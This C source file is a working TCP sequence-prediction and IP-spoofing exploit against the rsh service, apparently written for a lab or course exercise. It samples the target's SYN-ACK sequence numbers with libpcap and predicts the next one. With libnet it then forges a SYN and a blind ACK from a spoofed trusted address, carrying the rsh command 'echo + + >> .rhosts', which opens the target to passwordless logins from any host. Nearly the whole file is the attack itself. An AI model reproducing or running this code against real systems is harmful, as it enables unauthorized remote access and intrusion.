#include <stdio.h>
#include <string.h>
#include <libnet.h>
#include <unistd.h>
#include <pcap.h>

/*
	Macros
*/

#define FILTER "src host 172.16.14.4 and port 513"
#define SIZE_ETHERNET 14
/*
	Definitions
*/

/* IP header */
struct ip_header {
	u_char ip_vhl;		/* version << 4 | header length >> 2 */
	u_char ip_tos;		/* type of service */
	u_short ip_len;		/* total length */
	u_short ip_id;		/* identification */
	u_short ip_off;		/* fragment offset field */
#define IP_RF 0x8000		/* reserved fragment flag */
#define IP_DF 0x4000		/* dont fragment flag */
#define IP_MF 0x2000		/* more fragments flag */
#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
	u_char ip_ttl;		/* time to live */
	u_char ip_p;		/* protocol */
	u_short ip_sum;		/* checksum */
	struct in_addr ip_src,ip_dst; /* source and dest address */
};
#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct tcp_header {
	u_short th_sport;	/* source port */
	u_short th_dport;	/* destination port */
	tcp_seq th_seq;		/* sequence number */
	tcp_seq th_ack;		/* acknowledgement number */
	u_char th_offx2;	/* data offset, rsvd */
#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
	u_char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;		/* window */
	u_short th_sum;		/* checksum */
	u_short th_urp;		/* urgent pointer */
};

int tcp_packet(libnet_t *l, uint8_t type, uint8_t *payload, uint32_t payload_s, char *dst_ip, uint16_t dst_port, char *src_ip, uint32_t seq, char *err_buf);
int spoof(char *dst_ip, uint16_t dst_port, char *src_ip, char *spoof_ip);

/*
	Functions
*/

int main(int argc, char *argv[]) {
	if (spoof(argv[1], atoi(argv[2]), argv[3], argv[4])){
		printf("ERROR\n");
		return -1;
	}
	return 0;
}

int spoof(char *dst_ip, uint16_t dst_port, char *src_ip, char *spoof_ip) {
	
    char *dev, errbuf[PCAP_ERRBUF_SIZE], err_buf[LIBNET_ERRBUF_SIZE];;
    const u_char *packet;
    char *payload="0\0tsutomu\0tsutomu\0echo + + >> .rhosts\0";
	uint32_t seq1 = 0, seq2 = 0, seq3, i;
	//uint32_t payload_s;
	pcap_t *handle;
	struct pcap_pkthdr hdr;
	bpf_u_int32 net, mask;		
	struct bpf_program fp;		
	//struct ether_header *eth;
	libnet_t *l;

	int pattern = 0;
	uint32_t seq[3];
	int cont = 0;
	int j;
    int status;


	l = libnet_init(LIBNET_RAW4, NULL, errbuf);
	libnet_seed_prand(l);
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL) {
		printf("DEV ERROR\n");

		return -1;
	}
	if (pcap_lookupnet(dev, &net, &mask, errbuf) < 0) {
		printf("LOOKUPNET ERROR\n");

		net = 0;
		mask = 0;
		return -1;
	}
	handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
	if (handle == NULL) {
		printf("HANDLE ERROR\n");

		return -1;
	}
	if (pcap_compile(handle, &fp, FILTER, 0, net) < 0) {
		printf("COMPILE ERROR\n");

		return -1;
	}
	if (pcap_setfilter(handle, &fp) < 0) {
		printf("SETFILTER ERROR\n");

		return -1;
	}

	//syncronize with sequence pattern

	while(pattern == 0){
		if(cont == 20){ //after 20 try change the sequences and try
			fprintf(stderr, "unable to sync\n");
			seq[0]=seq[1];
			seq[1]=seq[2];
			pattern=1;
		}

		if (cont == 0){
			if (tcp_packet(l, TH_SYN, NULL, 0, dst_ip, dst_port, src_ip, libnet_get_prand(LIBNET_PRu32), err_buf) < 0) {
				printf("TCP SEND 2 PACKET ERROR\n");
				return -1;
			}
			packet = pcap_next(handle, &hdr); //listen for the first packet

			if (packet == NULL) {
				fprintf(stderr, "Error packet %s",libnet_geterror(l));
		        exit(0);

				return -1;
			}
			struct ip_header *ip = (struct ip_header *)(packet + 14);
			uint32_t size_ip = IP_HL(ip) * 4;
			if (size_ip < 20) {
				fprintf(stderr, "Error size ip %s",libnet_geterror(l));
		        exit(0);

				return -1;
			}
			struct tcp_header *tcp = (struct tcp_header *)(packet + 14 + size_ip);
			uint32_t size_tcp = TH_OFF(tcp) * 4;
			if (size_tcp < 20) {
				fprintf(stderr, "Error size tcp %s",libnet_geterror(l));
	        	exit(0);

				return -1;
			}

			seq[0] = ntohl(tcp->th_seq); //save the first sequence
		}

		for(j = 1; j < 3; j++){
			if (tcp_packet(l, TH_SYN, NULL, 0, dst_ip, dst_port, src_ip, libnet_get_prand(LIBNET_PRu32), err_buf) < 0) {
				printf("TCP SEND 2 PACKET ERROR\n");
				return -1;
			}

			packet = pcap_next(handle, &hdr); //listen for the other two packets

			if (packet == NULL) {
				fprintf(stderr, "Error packet %s",libnet_geterror(l));
		        exit(0);

				return -1;
			}
			struct ip_header *ip = (struct ip_header *)(packet + 14);
			uint32_t size_ip = IP_HL(ip) * 4;
			if (size_ip < 20) {
				fprintf(stderr, "Error size ip %s",libnet_geterror(l));
		        exit(0);

				return -1;
			}
			struct tcp_header *tcp = (struct tcp_header *)(packet + 14 + size_ip);
			uint32_t size_tcp = TH_OFF(tcp) * 4;
			if (size_tcp < 20) {
				fprintf(stderr, "Error size tcp %s",libnet_geterror(l));
	        	exit(0);

				return -1;
			}

			seq[j] = ntohl(tcp->th_seq); //save the other two sequence

		}
		if((seq[2]-seq[1])==(seq[1]-seq[0]+11111111)){ // check distance if it is ok
			pattern=1;
		}else{
			seq[0]=seq[2]; //if it is not replace the third sequence with the first one and continue
			cont++;
		}
	}

	// CALCULATE NEXT SEQUENCE NUMBER
	for (i = 0; i < 2; i++) {
		if (tcp_packet(l, TH_SYN, NULL, 0, dst_ip, dst_port, src_ip, libnet_get_prand(LIBNET_PRu32), err_buf) < 0) {
			printf("TCP SEND 2 PACKET ERROR\n");

			return -1;
		}

		packet = pcap_next(handle, &hdr);

		if (packet == NULL) {
			fprintf(stderr, "Error packet %s",libnet_geterror(l));
	        exit(0);

			return -1;
		}
		struct ip_header *ip = (struct ip_header *)(packet + SIZE_ETHERNET);
		uint32_t size_ip = IP_HL(ip) * 4;
		if (size_ip < 20) {
			fprintf(stderr, "Error size ip %s",libnet_geterror(l));
	        exit(0);

			return -1;
		}
		struct tcp_header *tcp = (struct tcp_header *)(packet + SIZE_ETHERNET + size_ip);
		uint32_t size_tcp = TH_OFF(tcp) * 4;
		if (size_tcp < 20) {
			fprintf(stderr, "Error size tcp %s",libnet_geterror(l));
        	exit(0);

			return -1;
		}
		if (i == 0) {
			seq1 = ntohl(tcp->th_seq);
			//printf("SEQ1:%u\n", seq1);
		}
		else {
			seq2 = ntohl(tcp->th_seq);
			//printf("SEQ2:%u\n", seq2);
		}
	}
	seq3 = seq2 + (seq2 - seq1) + 11111111;
	//printf("SEQ3:%u\n", seq3);

	

	uint32_t __dst_ip = libnet_name2addr4(l, dst_ip, 1);
	
	//SYN
	libnet_ptag_t tcp=LIBNET_PTAG_INITIALIZER;
    tcp =libnet_build_tcp(
        514,        
        514,        
        12345,      
        1,      
        TH_SYN,   
        libnet_get_prand(LIBNET_PRu16), 
        0,
        0,
        LIBNET_TCP_H + 0, 
        (u_int8_t *)NULL,
        0,
        l,
        tcp
    );

	if(tcp==-1)
    {
        fprintf(stderr, "Error building tcp header %s",libnet_geterror(l));
        exit(0);
    }

	//SPOOF IP CONVERSION
	uint32_t __src_ip = libnet_name2addr4(l, spoof_ip, 1);
	libnet_ptag_t ip= LIBNET_PTAG_INITIALIZER;
    ip=libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + 0, 
        0,
        libnet_get_prand(LIBNET_PRu16),
        0,
        64,
        IPPROTO_TCP,
        0,
        __src_ip,
		__dst_ip,
        NULL,
        0,
        l,
        ip
    );

    if(ip==-1)
    {
        fprintf(stderr, "Error building ip header %s",libnet_geterror(l));
        exit(0);
    }

	int write=libnet_write(l);
    if(write==-1)
    {
        fprintf(stderr, "Error writing the packet");
        fprintf(stderr, "%s",libnet_geterror(l));
    }
    sleep(1);

	//ACK	
    tcp =libnet_build_tcp(
        514,        
        514,       
        12346,      
        seq3+1,      
        (TH_ACK | TH_PUSH),   
        libnet_get_prand(LIBNET_PRu16), 
        0,
        0,
        LIBNET_TCP_H + 38, 
        (u_int8_t *)payload,
        38,
        l,
        tcp
    );

    if(tcp==-1)
    {
        fprintf(stderr, "Error building the tcp header %s",libnet_geterror(l));
        exit(0);
    }
	
	//IP
    ip=libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + (u_int32_t)38, 
        0,
        libnet_get_prand(LIBNET_PRu16),
        0,
        64,
        IPPROTO_TCP,
        0,
    	__src_ip,
        __dst_ip,
        NULL,
        0,
        l,
        ip
    );

    if(ip==-1)
    {
        fprintf(stderr, "Error building the ip header %s",libnet_geterror(l));
        exit(0);
    }

	write=libnet_write(l);
    if(write==-1)
    {
        fprintf(stderr, "Error writing the packet");
        fprintf(stderr, "%s",libnet_geterror(l));
    }

	pcap_close(handle);
	libnet_destroy(l);
	return 0;
}

int tcp_packet(libnet_t *l, uint8_t type, uint8_t *payload, uint32_t payload_s, char *dst_ip, uint16_t dst_port, char *src_ip, uint32_t seq, char *err_buf) {
	uint32_t __src_ip = libnet_name2addr4(l, src_ip, 1);
	uint32_t __dst_ip = libnet_name2addr4(l, dst_ip, 1);
	libnet_ptag_t ret = LIBNET_PTAG_INITIALIZER;
	
	ret = libnet_build_tcp(dst_port, dst_port, seq, 0, 
		type, libnet_get_prand(LIBNET_PRu16), 0, 0, LIBNET_TCP_H,  payload, payload_s, l, 0);
	if (ret < 0) {
		return -1;
	}

	ret = libnet_build_ipv4(LIBNET_TCP_H + LIBNET_IPV4_H, 0, libnet_get_prand(LIBNET_PRu16), 0, 
		64, IPPROTO_TCP, 0, __src_ip, __dst_ip, payload, payload_s, l, 0);
	if (ret < 0) {
		return -1;
	}
	ret = libnet_write(l);
	if (ret < 0) {
		return -1;
	}
	libnet_clear_packet(l);
	return 0;
}
